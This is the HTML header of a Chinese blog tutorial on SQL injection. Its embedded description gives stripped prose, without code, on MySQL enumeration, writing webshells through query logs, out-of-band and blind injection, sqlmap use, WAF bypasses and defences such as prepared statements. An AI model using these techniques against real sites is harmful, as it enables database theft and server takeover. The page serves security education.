<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>SQL注入 | CCB</title><meta name="keywords" content="渗透测试"><meta name="author" content="ccb"><meta name="copyright" content="ccb"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="SQL注入"><meta name="application-name" content="SQL注入"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="SQL注入"><meta property="og:url" content="https://frankcao3.github.io/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/2.%20SQL%E6%B3%A8%E5%85%A5"><meta property="og:site_name" content="CCB"><meta property="og:description" content="SQL注入 1. 概念SQL注入是一种将SQL代码插入或添加到应用（用户）的输入参数中的攻击，之后再将这些参数传递给后台的sql服务器加以解析和执行。 sql注入的方式主要是直接将代码插入参数中，这些参数会被置入sql命令中加以执行。间接的攻击方式是将恶意代码插入字符串中，之后将这些字符串保存到数据"><meta property="og:locale" content="en"><meta property="og:image" content="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg"><meta property="article:author" content="ccb"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg"><meta name="description" content="SQL注入 1. 概念SQL注入是一种将SQL代码插入或添加到应用（用户）的输入参数中的攻击，之后再将这些参数传递给后台的sql服务器加以解析和执行。 sql注入的方式主要是直接将代码插入参数中，这些参数会被置入sql命令中加以执行。间接的攻击方式是将恶意代码插入字符串中，之后将这些字符串保存到数据"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="https://frankcao3.github.io/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/2.%20SQL%E6%B3%A8%E5%85%A5"><link rel="preconnect" href="//cdn.cbd.int"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.20/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  linkPageTop: undefined,
  peoplecanvas: {"enable":true,"img":"https://upload-bbs.miyoushe.com/upload/2023/09/03/125766904/ee23df8517f3c3e3efc4145658269c06_5714860933110284659.png"},
  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
  diytitle: {"enable":true,"leaveTitle":"w(ﾟДﾟ)w 不要走！再看看嘛！","backTitle":"♪(^∇^*)欢迎肥来！"},
  LA51: undefined,
  greetingBox: undefined,
  twikooEnvId: '',
  commentBarrageConfig:undefined,
  root: '/',
  preloader: {"source":3},
  friends_vue_info: undefined,
  navMusic: true,
  mainTone: undefined,
  authorStatus: undefined,
  algolia: undefined,
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
  noticeOutdate: {"limitDay":365,"position":"top","messagePrev":"It has been","messageNext":"days since the last update, the content of the article may be outdated."},
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  relativeDate: {
    homepage: false,
    simplehomepage: true,
    post: false
  },
  runtime: 'days',
  date_suffix: {
    just: 'Just',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: {"copy":true,"copyrightEbable":true,"limitCount":50,"languages":{"author":"Author: ccb","link":"Link: ","source":"Source: CCB","info":"Copyright is owned by the author. For commercial reprints, please contact the author for authorization. For non-commercial reprints, please indicate the source.","copySuccess":"Copy success, copy and reprint please mark the address of this article"}},
  lightbox: 'fancybox',
  Snackbar: {"chs_to_cht":"Traditional Chinese Activated Manually","cht_to_chs":"Simplified Chinese Activated Manually","day_to_night":"Dark Mode Activated Manually","night_to_day":"Light Mode Activated Manually","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false,
  shortcutKey: undefined,
  autoDarkmode: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  configTitle: 'CCB',
  title: 'SQL注入',
  postAI: '',
  pageFillDescription: 'SQL注入, 1. 概念, 2. 产生过程, 3. 常见原因, 不当的处理类型, 不安全的数据库配置, 不合理的查询集处理, 不当的错误处理（盲注）, 多个提交处理不当, 4. 危害, 5. MySQL注入流程, 判断注入点以及注入类型, 信息收集（高版本数据库）, 猜解数据库列数（字段数）, 判断前端回显, 查询数据库版本, 查询数据库名称, 查询数据库用户, 查询操作系统, 查询指定数据库下的表名信息, 查询指定表名下的列名, 查询指定数据, 跨库查询, 查询所有的数据库名, 查询指定数据库下的表名信息, 查询指定表名下的列名信息, 查询指定数据, 信息收集（低版本数据库）, x3Dx3D文件读写操作x3Dx3D, 文件路径获取, 读写问题：魔术引号开关, 利用SQL注入执行命令, x3Dx3DSQL注入写webshelx3Dx3D, 上传webshell文件, 利用分隔符写入, 利用日志写入, 6. SQL注入进阶, x3Dx3D堆叠注入x3Dx3D, 加解密编码注入, 二次注入（绕过转义）, load_fileampDNSlog注入（解决无回显）, 宽字节注入（绕过转义）, XFF注入, 7. SQL注入类型, 按照注入方式, 普通注入和盲注, 基于报错的SQL盲注（优先）, 基于布尔的SQL盲注（其次）, 基于时间的SQL盲注（最后考虑）, 按照注入的数据类型, 数字型, 字符型, 搜索型, 按照提交参数方式, get数据注入, post数据注入, cookie注入, request请求注入, $_SERVER注入, json数据注入, HTTP头部参数注入, 8. 各种数据库注入, access注入（暴力）, msSQL注入（pangolin穿山甲）, postgreSQL注入, Oracle注入, mongoDB注入, 9. sqlmap, get数据注入, post数据注入, 8. SQL注入防护, 字符转义, 整数过滤, 过滤关键字, waf防护软件, 使用预编译PDO注入概念注入是一种将代码插入或添加到应用用户的输入参数中的攻击之后再将这些参数传递给后台的服务器加以解析和执行注入的方式主要是直接将代码插入参数中这些参数会被置入命令中加以执行间接的攻击方式是将恶意代码插入字符串中之后将这些字符串保存到数据库的数据表中或将其当成元数据当将存储的字符串置入动态命令中时恶意代码就将被执行如果应用未对动态构造的语句使用的参数进行正确性审查即便使用了参数化技术攻击者就很可能会修改后台语句的构造如果攻击者能够修改语句那么该语句将与应用的用户具有相同的权限产生过程大多数的应用都需要与数据库进行交互并且大多数应用编程语言如和均提供了可编程的方法来与数据库连接并进行交互如果应用开发人员无法确保在将从表单及输入参数等收到的值传递给查询该查询在数据库服务器上执行之前已经对其进行过验证那么通常会出现注入漏洞如果攻击者能够控制发送给查询的输入并且能够操纵该输入将其解析为代码而非数据那么攻击者就很有可能有能力在后台数据库执行该代码常见原因转义字符处理不合适不安全的数据库配置不合理的查询集处理不当的错误处理多个提交处理不当不当的处理类型数据库将单引号字符解析成代码与数据间的分界线单引号外面的内容均是需要运行的代码而用单引号引起来的内容均是数据因为只需要简单的在或页面的字段中输入一个单引号就能很快速的识别出站点是否会受到注入攻击不安全的数据库配置数据库带有很多默认的用户预安装内容比如默认账户名默认表名等这些可能会成为注入访问数据库的首要尝试使用声名狼藉的作为数据库系统管理员账户使用和用户账户则在创建数据库时通常会创建和账户这些并非是全部的账号只是比较出名的账户中的一部分还有很多其他的账户其他账户同样按默认方式进行预设口令总所周知攻击者利用注入漏洞时通常会尝试访问数据库的元数据比如内部的数据库和表的名称列的数据类型和访问权限例如服务器的元数据位于虚拟数据库中可通过和命令访问所有的用户均有权限访问该数据库中的表但只能查看表中那些与该用户访问权限相对应的对象的行不合理的查询集处理有时需要使用动态的语句对某些复杂的应用进行编码因为程序开发阶段可能还不知道要查询的表或字段或者不存在比如与大型数据库交互的应用这些数据库在定期创建的表中的数据由于应用已经产生了输入因而开发人员会信任该数据攻击者可以使用自己的表和字段数据来替换应用产生的值从而影响系统的返回值不当的错误处理盲注错误处理不当会为站点带来很多安全方面的问题最常见的问题是将详细的内部错误消息如错误代码数据库转存储显示给用户或攻击这些错误消息会泄露实现细节为攻击者提供与网站潜在缺陷相关的重要线索多个提交处理不当大型的开发项目会出现这样的问题有些开发人员会对输入进行验证而一些开发人员则不以为然对于开发人员团队甚至公司来说彼此独立工作的情形并不少见很难保证项目中每个人都遵循相同的标准开发人员还倾向于围绕用户来设计应用他们尽可能的使用预期的处理流程来引导用户认为用户将遵循他们已经设计好的逻辑顺序例如当用户已到达一系列表单中的第三个表单时他们会期望用户肯定已经完成第一个和第二个表达但实际上借助乱序来请求资源能够非常容易的避开预期的数据流程危害盗取网站的数据库敏感信息绕过网站后台认证万能密码登录绕过借助注入漏洞提权获取系统权限上传或读取文件执行系统命令注入流程以为例查看源码分析注入原理在上面的代码中可以看到网页以请求获得变量的值然后将变量拼接到数据库查询语句进行数据库操作直接传递的变量带入语句中执行没有做任何的限制判断注入点以及注入类型在给赋值时加上其他无意义的字符或者或者更换闭合条件为单引号之类的字符串如果网站在不同输入下能回显出不同页面显示的结果解析了或者回显为空解析了证明有注入漏洞如果网站显示或者之类的错误或其他报错说明网站进行了字符过滤之类的操作没有注入漏洞闭合条件根据语句的结构不同而不同数字型就没有闭合字符型就是单引号或双引号再次基础上还有可能跟一个或多个括号页面回显正常输出页面回显提示错误信息收集高版本数据库必要知识点在以上版本中存在一个自带数据库名为它是一个存储记录有所有数据库名表名列名的数据库也相当于可以通过查询它获取指定数据库下面的表名或列名信息数据库中符号代表下一级比如代表数据库中的表因此记录所有表名信息的表记录所有列名信息的表数据库名表名列名用于性能分析而用于存储数据库元数据关于数据的数据例如数据库名表名列的数据类型访问权限等中的表实际上是视图而不是基本表因此文件系统上没有与之相关的文件猜解数据库列数字段数使用判断列数用于指定查询结果按照第几列进行排序若所指定的列号超出数据库表原本的列数就会报错以下结果中有回显就出现报错了说明列的数量为判断前端回显判断的哪几个位置会被前端回显后续查询就在该位置进行其中令为就可以使前的语句为假从而只显示后面语句的执行结果结果显示的位置会被前端回显查询数据库版本查询数据库名称查询数据库用户若是用户则方便执行进一步的攻击行为如利用上传文件未授权漏洞写入计划任务的利用方式也是需要权限查询操作系统比如注入时发现第个位置会回显在这个个位置查询用户和操作系统以及数据库名称和版本名称查询指定数据库下的表名信息根据刚才的信息收集已知当前页面所操作的数据库名为或者直接使用表示然后可以借助查询该数据库的所有表名得到表名之后要确定哪一个表存储着用户数据可以根据表名猜测或是逐表查看字段查询指定表名下的列名根据刚才收集的表名查询该表的所有列名查询指定数据根据刚才收集的表名列名可以查询该表的指定数据指定数据可能有多个结果可以使用从的位置读取条记录变动猜解得到不同结果得到的密码一般为去碰撞一下跨库查询注入中首先要明确当前注入点权限取决于注入点所使用的数据库用户的权限使用语句查询高权限注入时有更多的攻击手法有的能直接进行操作比如上述注入中借助的是账户的权限进行数据库操作若用户具有当前数据库之外的操作权限那么就可以注入其他数据库获取想要的信息除了记录有所有的表名列名还有所有的数据库名记录所有数据库名信息的表跨库其中字段表示数据库名查询的前提是用户具有相应的权限查询所有的数据库名查询指定数据库下的表名信息查询指定表名下的列名信息当出现多个记录时可以使用取第一个记录查询指定数据查询两列的数据注意指定来自信息收集低版本数据库暴力查询或结合读取查询工具字典读取源代码的数据库查询语句暴力猜解文件读写操作读取函数读取文件内容常见的读取的敏感信息路径或上传文件写入后门木马其中用于注释后面的语句后面有文件路径获取文件的读写都需要获取到文件路径路径获取常见方法包括报错显示网站报错时显示的一些路径信息遗留文件站长调试网站时遗留的一些文件比如通过该文件可以得到路径信息报错信息的漏洞平台配置文件不实用比如在中配置文件中保存了网站的绝对路径缺点是配置文件的路径并不固定爆破等会有惯用的一些路径可以进行路径爆破读写问题魔术引号开关概念魔术引号设计的初衷是为了让从数据库或文件中读取数据和从请求中接收参数时对单引号双引号反斜线加上一个反斜线进行转义这个的作用跟的作用完全相同函数返回在预定义字符之前添加反斜杠的字符串在中该开关为参数在的行左右其实由于不是所有数据都需要转义出于性能的考虑魔术引号开关在及其之后版本中被取消了在运行时调用转义函数如会更有效率影响如果开启魔术引号则上传语句会被转义成如下内容使注入命令失效绕过可以把引号所包含的路径内容不要单引号编码为进行绕过绕过原理可以识别并执行用表示的语句利用注入执行命令借助运行命令先执行一次刷新处理上次的配置启用的高级配置刷新配置打开可以调用系统之外的命令使用在盘创建一个文件夹表示是否输出信息执行系统命令的几种方式通过沙盒执行命令注入写上传文件上传文件的条件网站物理路径文件写入的权限不为时无法导入导出文件而当设置不为空时导入导出文件不受限制如果设置为某个文件路径如时则导入导出必须要在该文件目录下完成利用分隔符写入物理路径一句话编码物理路径一句话编码物理路径一句话编码物理路径一句话编码利用日志写入新版本的设置了导出文件的路径很难在获取过程中去修改配置文件无法通过使用来写入一句话这时我们可以通过修改的文件来获取利用条件对目录有写权限关闭是否对单引号转义有绝对路径读文件可以不用写文件需要需要能执行多行语句查看配置开启模式将所有到达的语句记录下来设置日志目录为地址写入关闭模式在高版本的中默认为就是不让导入和导出解决办法在下可在的里面添加在下可在的里面添加使用慢查询日志绕过此限制查看慢查询日志开启情况开启慢查询日志修改日志文件存储的绝对路径写入使用慢查询日志时只有当查询时间超过系统时间默认为秒时才会记录在日志中使用如下语句可查看系统时间免杀注入进阶堆叠注入堆叠注入就是多条语句一起执行在中一条语句结尾加表示语句结束多语句之间以分号隔开堆叠注入就是利用这个特点在第二个语句中构造自己要执行的语句比如将堆叠注入运用于创建用户以此迂回得到自定义的账户密码但是前提是网站的管理员必须是高权限才能完全创建用户也可以使用更新管理员用户密码当网站使用技术一种防护手段执行语句时可以执行多语句不过这样通常不能直接得到注入结果因为只会返回第一条语句执行的结果所以在第二条语句中可以用更新数据或者使用时间盲注获取数据加解密编码注入某些注入点会对参数值进行编码比如下面的进行了编码是一个加密的字符串其中是编码中的符号把他发送到编码模块当中解密得到明文所以构造好注入语句后也需要进行编码也就是说加密之后的值是而获取数据库名称的报错盲注的语句加密后值二次注入绕过转义二次注入原理主要分为两步第一步插入恶意数据第一次进行数据库插入数据的时候仅仅对其中的特殊字符进行了转义在写入数据库的时候还是保留了原来的数据但是数据本身包含恶意内容第二步引用恶意数据在将数据存入到了数据库中之后开发者就认为数据是可信的在下一次需要进行查询的时候直接从数据库中取出了恶意数据没有进行进一步的检验和处理这样就会造成的二次注入在前端和黑盒测试是无法发现二次注入无法用工具扫描只有在代码审计时才能发现是否存在二次注入也就是提前知道所插入的恶意数据的类型在哪里被利用举例比如已经通过代码审计知道网页有注册和查询更改密码的功能并且注册页面会在后台执行语句更改密码则包含语句在注册页面网站使用了进行了特殊字符的转义所以无法直接进行注入但是也因此可以插入一些恶意数据比如使用作为用户名进行注册那么在更新密码页面就会执行同理如果换成注册其它用户名更新的时候也会形成不同的注入语句比如使用作为用户名注册那么更新密码时就会执行被更新密码的账户从变成了以此类推可以借助用户名来爆数据库信息若输入用户名和密码那么更新密码的就是但是网站有时会限制用户名长度如果是在前端限制可以修改如果是后端代码进行的限制则无法成功注入注入解决无回显带外注入实际案例解决了盲注不能回显数据效率低的问题原理支持对外的文件读取通过在中加入语句可以借助读取访问记录得到语句的执行结果比如构造如下语句工具注册后可以获得个人的地址成功注入之后可以在网站看到所访问的链接其中包含了数据库版本信息或者查看数据库名称参考资料使用盲注仅限于环境使用工具获取数据库名称宽字节注入绕过转义当网站对参数进行了转义时单引号等会被转义符反斜杠转义导致攻击语句失效所以在一般情况下此处是不存在注入漏洞的不过有一个特例就是当数据库的编码为时可以使用宽字节注入宽字节的格式是在单引号前会先加个这样就变成了经过转义就是因为反斜杠的编码为而在编码中是繁体字連所以这时单引号成功被读入所以可以构造攻击语句进行注入点的判断注入是请求头中的一个头部参数简称头它代表客户端真实的通过修改的值可以伪造客户端将设置为然后访问该页面返回正常如果网站有通过诸如之类的函数获取并用于语句那么就可以尝试进行注入比如构造攻击语句注入类型按照注入方式普通注入和盲注普通注入就是注入的页面是直接显示数据库中的字段内容的我们可以通过注入一步一步把数据库中我们想要的内容显示在页面中盲注则要困难很多页面不直接显示数据库字段内容显示的可能只是一个判断结果是或者否页面只能告诉你你构造的语句对还是错你要查询的内容存在还是不存在其中不回显的原因可能是语句的问题导致因为像等查询语句即使执行成功也不会回显此外网站的前端页面显示也会限制查询数据例应用查询用户插入数据例应用网站的用户注册和操作的数据包相似但是不能像普通注入一样操作删除数据例应用后台管理里面删除用户等操作删除留言等更新数据例应用会员或后台中心数据同步或缓存等操作登录后修改个人信息如密码等排序数据一般结合表名或列名进行数据排序操作例例基于报错的盲注优先种报错注入万能语句报错原理向下取整数为产生的随机小数按照指定字段对查询结果进行分组常结合等使用利用了的第号来进行的盲注使得由于函数的特性返回错误信息进而我们可以显示我们想要的信息从而达到注入的效果在和同时使用的时候可能会产生超出预期的结果因为会多次对同一列进行查询爆数据库版本通过修改后面数字一个一个爆表爆出所有表爆出所有字段名爆出所有字段名爆出该账户的密码由于是在数据包中编辑所以用代替空格避免歧义报错结果如下显示出了数据库名称为标记片段表示从字符串中匹配元素如果格式语法书写错误的话就会报错输出利用这个特性可以构造注入点利用函数将想要获得的数据库内容拼接到第二个参数中报错时作为内容输出报错注入其中的函数是将其参数连成一个字符串因此不会符合的格式从而出现格式错误爆出格式为文档对象的名称格式的字符串格式替换查找到的符合条件的数据作用改变文档中符合条件的节点的值即改变中符合的值此函数用来更新选定片段的内容将标记的给定片段的单个部分替换为新的片段然后返回更改的替换的部分与用户提供的表达式匹配如果未找到表达式匹配或者找到多个匹配项则该函数返回原始的片段所有三个参数都应该是字符串和上面的函数一样当路径语法错误时就会报错报错内容含有错误的路径内容基于布尔的盲注其次逻辑判断正则表达式返回字符串第一个字符的码取字符串子串布尔型盲注是指注入页面中没有直接显示数据内容但会显示输出的结果对还是错查询的数据有还是没有猜解数据库长度符合条件返回正确反之返回错误猜解数据库名因为需要验证的字符太多所以可以转化为码验证猜解表的总数判断表的总数猜解各个表名的长度第二个表猜解第一个表名或者猜解表的字段的总数表名表名第二个字段猜解第一个字段名表名或者表名或者直接猜解表名猜解内容长度假如已经知道字段名为猜解内容或者码猜解或者直接猜解基于时间的盲注最后考虑对于某些注入页面可能页面中任何信息都不返回甚至连记录是否存在都不告诉你这时布尔型盲注也就无效了但是基于函数可以实现延时查询我们可以构造一个判断语法如果返回结果为真则延时秒再进行查询操作那么我们就可以通过观察提交注入语句后页面响应是否有延时卡顿来判断我们构造的语句是否成立延时判断如果是则的返回值为否则返回值则为的返回值为数字值或字符串值具体情况视其所在语境而定若数据库名为则回显否则回显若数据库名为则延时否则不延时猜解数据库名长度猜中了延时逐个猜解数据库名猜中了延时逐个猜解表名猜中了延时判断或是否成立匹配及等条件转换成码从位置开始截取字符串的个字符与函数一样从位置开始截取字符串的长度从左侧截取的前位判断数据库名的长度判断的码是否等于盲注的加速方法减少查询次数提高查找的正确率二分法爆破字符位运算法每次查询确定一位这样一个字符只需要次就可以确定了利用位运算符实现取某一位的值按照注入的数据类型数字型现有的查询语句筛选条件匹配的字段是数值类型构造注入语句时不需要单引号和来闭合语法字符型现有的查询语句筛选条件匹配的字段是字符型一般字符型注入需要构造单引号双引号用于闭合语法还需要加入注释符使原本的引号以及后面的语句无效除单引号外语句也有其他的一些干扰符号等具体需看写法比如用于搜索字段中含有的记录或者增加了括号这时注入的话就要考虑来闭合语法实际中应该用什么符号来闭合语法需要自己尝试如何判断字符型数字型比如在文本框中输入和若都能返回数据都通过说明可能注入漏洞不是数字型应该是字符型形式因为对于字符型使用相当于执行的是这样网站对于或者都是取前面的都返回数据此时在文本框输入可以返回数据输入没有数据返回说明注入成功确认漏洞为的字符型注入注意有时用于闭合语法的不一定为单引号另外在中一般注释后面的字句是采用的在有些的字句中采用注释需要多测试才能发现若在文本框中输入和前者返回数据后者不返回直接确定是的数值型形式搜索型使用了之类的模糊匹配返回正确返回错误按照提交参数方式接受参数名的值赋值给变量接受参数名的值赋值给变量内置函数用于获取一些参数信息数据注入数据的注入在前面已经详细说明数据注入网站的不会显示具体的参数而是将参数放在表单中以请求的形式提交此时需要使用等工具来构造包抓包之后在数据包中进行相同的注入流程或者使用构造数据也可注入有时网站对请求都进行了关键词过滤难以注入但是忽略了也可以传递参数如果的参数也被用于语句那么也有成功注入的可能有时使用传参时会与冲突此时可能需要改为使用请求请求注入如果网站是请求那么可以在所有方法的位置提交包括下面的网站以或都能提交参数注入内置函数用于获取一些参数信息详解浏览器语言当前用户当前用户主机名如果通过获取的信息被用于语句那么就可能存在注入漏洞比如抓包后将浏览器信息进行修改如果网站将字段作为语句的参数那就可能存在注入成功的可能数据注入原理一样与其他注入一样只是注入点改为的键值对中的值头部参数注入有些网站调用的获取一些头部信息比如这些地方可以进行注入还有简称头它代表客户端真实的这里也可以尝试进行注入上例中的语句为操作无法像一样回显信息因此只能盲注各种数据库注入各种数据库的注入特点不同的数据库具有不同的注入特点每个数据库支持的功能不一样获取到的权限和可执行操作等不同包括等注入暴力数据库都是存放在网站目录下后缀格式为结构为表名列名数据不同的网站会有各自的数据库不会像那样一个网站的管理员可以操作多个数据库导致存在跨库注入的情况的结构为数据库名表名列名数据没有表数据库名操作系统等等都无法查询只能暴力猜解表名列名数据可以通过一些暴库手段目录猜解等下载数据库判断数据库类型由于各个数据库特征不同这里直接使用比较方便判断注入点猜解字段数量判断哪几个位置回显暴力猜解表名列名等信息比如猜当前表为看是否成功返回数据使用工具进行暴力猜解尝试爆表名尝试爆表的列名注入穿山甲判断数据库类型由于各个数据库特征不同这里直接使用穿山甲工具进行判断从工具中还可以看到不同数据库可以获得的权限明显可以得到更多权限在信息一栏中可以查看到数据库的各种信息版本数据库名计算机名数据库名管理员最高权限对应数据库各表名磁盘用户组用户等在获取数据一栏中可以获取数据库信息表名数据等的手工注入语句会与不同注入可以使用工具穿山甲识别数据库类型判断数据库权限判断是否为数据库管理员查看当前数据库查看名为的数据库的表名查看表的列名查看表的具体数据手工注入某些语句会有差别注入使用工具穿山甲手工注入参考文档注入使用工具不能识别这里介绍首先输入目标网站然后输入路径尝试攻击手工注入参考文档的查询文档方式与其他的数据库略微不同当进行条件查询的时候是用而是以键值对形式进行查询的比如按查询表中的数据构建回显查询操作的源代码为攻击语句爆库方法可以将对象转换为字符串格式化为数据格式相当于的数据库名爆表返回的是数组转化为格式相当于的查询指定数据元素集中查找使用函数用于从匹配的元素集的子元素中找出与指定表达式相匹配的元素集合同可视作同父子元素关系为第一条数据为第二条由于是字典形式所以键和值一起出来了不需要额外查询列注入点指纹判别数据库类型获取数据库版本信息指定可测试的参数指定数据库名指定表名指定字段保存注入过程到一个文件还可中断下次恢复在注入保存恢复要执行的测试水平等级默认为测试执行的风险等级默认为延迟响应默认为通过发送数据列出字段获取当前用户名称获取当前数据库名称列数据库所有用户数据库用户所有密码查看用户权限指定数据库用户列出所有数据库列出指定数据库中的表列出数据库中的表的所有字段列出所有数据库所有表只列出用户自己新建的数据库和表列出指定数据库的表的字段的数据列出指定数据库的表的字段的数据指定数据库类型指定系统详细的等级只显示的回溯错误和关键消息显示信息和警告消息显示调试消息有效载荷注入显示请求显示响应头显示响应页面的内容查看权限是否是数据库管理员枚举数据库用户角色导入用户自定义函数获取系统权限是否支持注入查询表记录语句测试采用注入配合方式提交数据用号分开注入使用欺骗自定义代理注入指定关键词字符串匹配采用多线程执行指定命令执行指定的语句读取指定文件写入本地文件将本地的文件写入到目标的要写入的文件绝对路径执行系统命令系统交互反弹绝对路径读取系统注册表延迟设置默认为秒指定注入盲注字段字典表字典常用语句简单的注入流程读取数据库版本当前用户当前数据库判断当前数据库用户权限用户名用户名读取所有数据库用户或指定数据库用户的密码获取所有数据库获取指定数据库中的所有表获取指定数据库名中指定表的字段获取指定数据库名中指定表中指定字段的数据读取文件写入文件到使用绕过防火墙进行注入测试简单的注入流程读取数据库版本当前用户当前数据库判断当前数据库用户权限用户名用户名读取所有数据库用户或指定数据库用户的密码获取所有数据库获取指定数据库中的所有表获取指定数据库名中指定表的字段获取指定数据库名中指定表中指定字段的数据读取文件写入文件到使用绕过防火墙进行注入测试确定要注入的有时需要获取访问该网站所需的数据注入查询所有的数据库名查询指定数据库的所有表名信息查询指定表名下的所有列名信息查询指定数据数据注入使用自动完成注入需要把正常包的内容复制到一个文档再调用文档来进行注入先使用拦截正常包右键选择复制到然后关闭的代理功能再使用命令来查询数据库名称使用命令查询表名使用命令查询字段名使用命令查询用户名和密码内容注入防护字符转义魔术引号开关会对单引号双引号反斜线加上一个一个反斜线进行转义会影响注入语句中的路径信息绕过方法宽字节待转义字符前加上整数过滤遇到函数过滤输入的情况直接跑路无法绕过过滤关键字被过滤参数过滤参数第一个参数是要过滤的值第二个参数是过滤后的值过滤效果变成了防护软件阿里云盾安全狗宝塔作用机制过滤关键字绕过方法更改提交方法大小写混合绕开黑名单解密编码类绕开黑名单为换行符为号为空格注释符号混用绕开注释过滤比如等价函数替换绕开关键字过滤特殊符号混用绕开关键字过滤空格被过滤用代替和被过滤可以用和来替代借助数据库特性多种语句参数污染函数的逻辑有严重错误一旦这个数组里的个数不止个并且每个组员都是开头那么返回只会返回第一个组员比如的结果为为但是取的是最后一个所以我们只需要把放在后面的就好垃圾数据溢出只能匹配一千个多了就不行了使用预编译是数据对象的缩写是在版本之后开始支持的技术不使用技术时语句是先在本地拼接完成后再传递至数据库处理所以会导致用户提交有猫腻的变量来改变原语句的结构从而实现注入使用技术后是先把语句的整体语法匹配的参数用当做占位符一起发送至数据库然后再把用户提交的查询参数发送至数据库由数据库来完成变量的转移处理用户输入只会被当成字符串字面值参数而语句则经过语法分析生成执行命令这样语句的整体语法结构和变量分开两次传递至数据库从而导致那些有猫腻的变量无法再改变语句的原始结构这种情况下注入攻击几乎无法实现这也是目前比较有效的防御注入攻击的方法之一关键字无法进行预编译如表名或者列名字段列名列名',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-10-06 17:09:05',
  postMainColor: '',
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
        }
      }
      const t = saveToLocal.get('theme')
    
          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

          if (t === undefined) {
            if (isLightMode) activateLightMode()
            else if (isDarkMode) activateDarkMode()
            else if (isNotSpecified || hasNoSupport) {
              const now = new Date()
              const hour = now.getHours()
              const isNight = hour <= 6 || hour >= 18
              isNight ? activateDarkMode() : activateLightMode()
            }
            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
              if (saveToLocal.get('theme') === undefined) {
                e.matches ? activateDarkMode() : activateLightMode()
              }
            })
          } else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
